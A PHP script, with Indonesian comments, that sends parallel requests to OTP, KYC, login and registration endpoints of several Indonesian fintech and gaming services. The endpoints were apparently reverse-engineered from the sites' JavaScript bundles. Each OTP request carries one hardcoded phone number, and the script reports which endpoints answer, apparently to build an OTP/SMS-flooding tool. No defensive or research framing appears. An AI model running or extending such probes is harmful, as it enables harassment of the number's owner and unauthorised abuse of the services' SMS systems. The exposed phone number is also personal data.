<?php
// Probe kandidat hasil RE JS (ronde 8). Semua dari source resmi situs live.
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$P = '6283822461998'; $L = '083822461998'; $N = '83822461998';

$REQS = [
  // --- Akseleran (api.akseleran.co.id), jalur + body dari bundle Next.js-nya ---
  ['name' => 'aksel-otp-req', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/users/otp/request',
   'h' => ['Content-Type: application/json', 'Accept: application/json'],
   'b' => '{"phone_number":"' . $L . '"}'],
  ['name' => 'aksel-otp-req2', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/users/otp/request',
   'h' => ['Content-Type: application/json', 'Accept: application/json', 'Authorization: Bearer null'],
   'b' => '{"phone_number":"' . $P . '"}'],
  ['name' => 'aksel-apiv1-otp', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/api/v1/otp/request',
   'h' => ['Content-Type: application/json', 'Accept: application/json'],
   'b' => '{"phone_number":"' . $L . '"}'],
  ['name' => 'aksel-apiv1-otp2', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/api/v1/otp/request',
   'h' => ['Content-Type: application/json', 'Accept: application/json'],
   'b' => '{"phone":"' . $L . '","channel":"sms"}'],
  ['name' => 'aksel-kyc-otp', 'm' => 'POST', 'url' => 'https://core.akseleran.com/api/v1/kyc/request-phone-otp',
   'h' => ['Content-Type: application/json', 'Accept: application/json', 'Origin: https://www.akseleran.co.id',
           'Referer: https://www.akseleran.co.id/'],
   'b' => '{"phone_number":"' . $L . '"}'],
  ['name' => 'aksel-kyc-otp2', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/api/v1/kyc/request-phone-otp',
   'h' => ['Content-Type: application/json', 'Accept: application/json'],
   'b' => '{"phone_number":"' . $L . '"}'],
  ['name' => 'aksel-login', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/auth/login',
   'h' => ['Content-Type: application/json', 'Accept: application/json'],
   'b' => '{"phone_number":"' . $L . '"}'],
  ['name' => 'aksel-register', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/users/register',
   'h' => ['Content-Type: application/json', 'Accept: application/json'],
   'b' => '{"phone_number":"' . $L . '"}'],

  // --- JULO / Makmur (login web), cek host auth-nya dulu ---
  ['name' => 'julo-probe', 'm' => 'GET', 'url' => 'https://www.julo.co.id/api/auth',
   'h' => ['Accept: application/json'], 'b' => ''],
  ['name' => 'makmur-probe', 'm' => 'GET', 'url' => 'https://www.makmur.id/api',
   'h' => ['Accept: application/json'], 'b' => ''],

  // --- duniagames: jalur baru hasil RE (v2 settlement & resend) buat buktiin format ---
  ['name' => 'dg-resend', 'm' => 'POST', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/resend-otp',
   'h' => ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
           'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/'],
   'b' => '{"phoneNumber":"' . $L . '","authId":"x"}'],
  ['name' => 'dg-settle-v1', 'm' => 'POST', 'url' => 'https://api.duniagames.co.id/api/transaction/v2/settlement/v1/req-otp',
   'h' => ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
           'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/'],
   'b' => '{"phoneNumber":"' . $L . '"}'],
];

$mh = curl_multi_init();
$cs = [];
foreach ($REQS as $i => $r) {
  $ch = curl_init();
  $hdrs = $r['h']; $hdrs[] = 'User-Agent: ' . ($r['ua'] ?? $UA); $hdrs[] = 'Accept-Language: id';
  curl_setopt_array($ch, [CURLOPT_URL => $r['url'], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 35, CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $r['m']]);
  if ($r['m'] !== 'GET') curl_setopt($ch, CURLOPT_POSTFIELDS, $r['b']);
  curl_multi_add_handle($mh, $ch);
  $cs[$i] = $ch;
}
$running = null; $errs = [];
do {
  curl_multi_exec($mh, $running);
  while (($info = curl_multi_info_read($mh)) !== false) {
    $idx = array_search($info['handle'], $cs, true);
    if ($info['result'] !== CURLE_OK) $errs[$idx] = curl_strerror($info['result']);
  }
  curl_multi_select($mh, 1.0);
} while ($running > 0);

foreach ($REQS as $i => $r) {
  $ch = $cs[$i];
  $body = (string) curl_multi_getcontent($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $flat = trim(preg_replace('/\s+/', ' ', $body));
  if (preg_match('/^\s*<(!doctype|html)/i', $flat)) $flat = '(html) ' . substr($flat, 0, 60);
  echo str_pad($r['name'], 18) . ' [' . ($code ?: '000') . '] '
    . (isset($errs[$i]) ? 'GAGAL: ' . $errs[$i] : ($flat !== '' ? substr($flat, 0, 220) : '(kosong)')) . "\n";
  curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\n";
